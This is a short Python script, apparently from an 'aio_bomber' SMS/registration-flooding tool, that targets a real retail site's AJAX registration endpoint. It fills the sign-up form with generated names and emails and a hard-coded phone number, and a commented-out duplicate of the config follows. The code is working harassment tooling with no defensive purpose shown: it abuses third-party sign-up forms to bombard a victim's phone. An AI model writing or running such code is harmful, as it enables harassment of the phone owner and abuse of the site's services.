from aio_bomber import utils, sender
import aiohttp
import asyncio

data = {
    "conteshop": {
        "url": "https://conteshop.by/ru/ajaxlogin/ajax/index/",
        "header": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        },
        "static_data": {
            "ajax": "register",
            "newsletter": "ok",
            "licence": "ok",
            "gender": "2"
        },
        "dynamic_data": {
            "formatted_phone": "phone",
            "email": "email",
            "firstname": "firstname",
            "lastname": "lastname"
        }
    }
}


async def main():
    session = aiohttp.ClientSession()
    utils_ = utils.BomberUtils()
    sender_ = sender.Sender(session)
    for value in data.values():
        args = utils_.generate_args(value, '375336718846')
        header = value.get('header')
        a = await sender_.post(header=header, **args)
        print(a)
    await session.close()

asyncio.run(main())


# data = {
#     "conteshop": {
#         "url": "https://conteshop.by/ru/ajaxlogin/ajax/index/",
#         "header": {
#             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
#         },
#         "static_data": {
#             "ajax": "register",
#             "newsletter": "ok",
#             "licence": "ok",
#             "gender": "2"
#         },
#         "dynamic_data": {
#             "formatted_phone": "phone",
#             "email": "email",
#             "firstname": "firstname",
#             "lastname": "lastname"
#         }
#     }
# }